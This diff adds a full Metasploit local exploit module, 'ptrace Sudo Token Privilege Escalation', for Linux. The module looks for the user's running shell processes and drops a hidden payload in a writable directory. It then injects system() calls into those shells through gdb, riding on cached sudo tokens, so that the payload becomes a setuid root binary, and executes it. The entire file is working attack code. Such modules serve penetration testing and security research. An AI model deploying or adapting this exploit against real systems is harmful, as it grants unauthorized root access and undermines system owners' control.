@@ -1,0 +1,213 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Kernel
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'ptrace Sudo Token Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges by blindly injecting into
+        the session user's running shell processes and executing commands by
+        calling `system()`, in the hope that the process has valid cached sudo
+        tokens with root privileges.
+
+        The system must have gdb installed and permit ptrace.
+
+        This module has been tested successfully on:
+
+        Debian 9.8 (x64); and
+        CentOS 7.4.1708 (x64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'chaignc', # sudo_inject
+          'bcoles'   # Metasploit
+        ],
+      'DisclosureDate' => '2019-03-24',
+      'References'     =>
+        [
+          ['EDB', '46989'],
+          ['URL', 'https://github.com/nongiach/sudo_inject'],
+          ['URL', 'https://www.kernel.org/doc/Documentation/security/Yama.txt'],
+          ['URL', 'http://man7.org/linux/man-pages/man2/ptrace.2.html'],
+          ['URL', 'https://lwn.net/Articles/393012/'],
+          ['URL', 'https://lwn.net/Articles/492667/'],
+          ['URL', 'https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/'],
+          ['URL', 'https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html']
+        ],
+      'Platform'       => ['linux'],
+      'Arch'           =>
+        [
+          ARCH_X86,
+          ARCH_X64,
+          ARCH_ARMLE,
+          ARCH_AARCH64,
+          ARCH_PPC,
+          ARCH_MIPSLE,
+          ARCH_MIPSBE
+        ],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'Targets'        => [['Auto', {}]],
+      'DefaultOptions' =>
+        {
+          'PrependSetresuid' => true,
+          'PrependSetresgid' => true,
+          'PrependFork'      => true,
+          'WfsDelay'         => 30
+        },
+      'DefaultTarget'  => 0))
+    register_options [
+      OptInt.new('TIMEOUT', [true, 'Process injection timeout (seconds)', '30'])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def timeout
+    datastore['TIMEOUT']
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def check
+    if yama_enabled?
+      vprint_error 'YAMA ptrace scope is restrictive'
+      return CheckCode::Safe
+    end
+    vprint_good 'YAMA ptrace scope is not restrictive'
+
+    if command_exists? '/usr/sbin/getsebool'
+      if cmd_exec("/usr/sbin/getsebool deny_ptrace 2>1 | /bin/grep -q on && echo true").to_s.include? 'true'
+        vprint_error 'SELinux deny_ptrace is enabled'
+        return CheckCode::Safe
+      end
+      vprint_good 'SELinux deny_ptrace is disabled'
+    end
+
+    unless command_exists? 'sudo'
+      vprint_error 'sudo is not installed'
+      return CheckCode::Safe
+    end
+    vprint_good 'sudo is installed'
+
+    unless command_exists? 'gdb'
+      vprint_error 'gdb is not installed'
+      return CheckCode::Safe
+    end
+    vprint_good 'gdb is installed'
+
+    CheckCode::Detected
+  end
+
+  def exploit
+    unless check == CheckCode::Detected
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    if nosuid? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is mounted nosuid"
+    end
+
+    # Find running shell processes
+    shells = %w[ash ksh csh dash bash zsh tcsh fish sh]
+
+    system_shells = read_file('/etc/shells').to_s.each_line.map {|line|
+      line.strip
+    }.reject {|line|
+      line.starts_with?('#')
+    }.each {|line|
+      shells << line.split('/').last
+    }
+    shells = shells.uniq.reject {|shell| shell.blank?}
+
+    print_status 'Searching for shell processes ...'
+    pids = []
+    if command_exists? 'pgrep'
+      cmd_exec("pgrep '^(#{shells.join('|')})$' -u \"$(id -u)\"").to_s.each_line do |pid|
+        pids << pid.strip
+      end
+    else
+      shells.each do |s|
+        pidof(s).each {|p| pids << p.strip}
+      end
+    end
+
+    if pids.empty?
+      fail_with Failure::Unknown, 'Found no running shell processes'
+    end
+
+    print_status "Found #{pids.uniq.length} running shell processes"
+    vprint_status pids.join(', ')
+
+    # Upload payload
+    @payload_path = "#{base_dir}/.#{rand_text_alphanumeric 10..15}"
+    upload @payload_path, generate_payload_exe
+
+    # Blindly call system() in each shell process
+    pids.each do |pid|
+      print_status "Injecting into process #{pid} ..."
+
+      cmds = "echo | sudo -S /bin/chown 0:0 #{@payload_path} >/dev/null 2>&1 && echo | sudo -S /bin/chmod 4755 #{@payload_path} >/dev/null 2>&1"
+      sudo_inject = "echo 'call system(\"#{cmds}\")' | gdb -q -n -p #{pid} >/dev/null 2>&1"
+      res = cmd_exec sudo_inject, nil, timeout
+      vprint_line res unless res.blank?
+
+      next unless setuid? @payload_path
+
+      print_good "#{@payload_path} setuid root successfully"
+      print_status 'Executing payload...'
+      res = cmd_exec "#{@payload_path} & echo "
+      vprint_line res
+      return
+    end
+
+    fail_with Failure::NoAccess, 'Failed to create setuid root shell. Session user has no valid cached sudo tokens.'
+  end
+
+  def on_new_session(session)
+    if session.type.eql? 'meterpreter'
+      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
+      session.fs.file.rm @payload_path
+    else
+      session.shell_command_token "rm -f '#{@payload_path}'"
+    end
+  ensure
+    super
+  end
+end
